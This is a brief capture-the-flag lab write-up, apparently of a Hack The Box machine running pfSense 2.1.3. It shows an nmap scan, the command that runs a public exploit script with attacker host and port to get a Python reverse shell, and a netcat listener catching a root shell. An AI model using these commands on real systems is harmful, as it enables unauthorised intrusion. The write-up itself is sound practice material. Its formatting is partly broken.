###### Quick fast scan on top 100 ports
```sh
nmap -F -Pn -T4 10.10.10.60
```

```
Starting Nmap 7.93 ( https://nmap.org ) at 2023-08-02 22:12 EDT
Nmap scan report for 10.10.10.60

We have port 80 and 443 Open

Same result for top 1k ports scan and all port scan

Default scripts scan and Version scan on Port 443 and 80

We can see the version of pfsense is 2.1.3

We copy exploit to our directory
![[Pasted image 20230803103329.png]]

On checking exploit we see that it takes the arguments and runs a python reverse shell

```sh
python 43560.py --rhost 10.10.10.60 --lhost 10.10.14.10 --lport 4443 --username rohit --password pfsense
```

We get a direct root shell

```sh
‚îî‚îÄ$ nc -nlvp 4443
listening on [any] 4443 ...
connect to [10.10.14.10] from (UNKNOWN) [10.10.10.60] 55834
sh: can't access tty; job control turned off
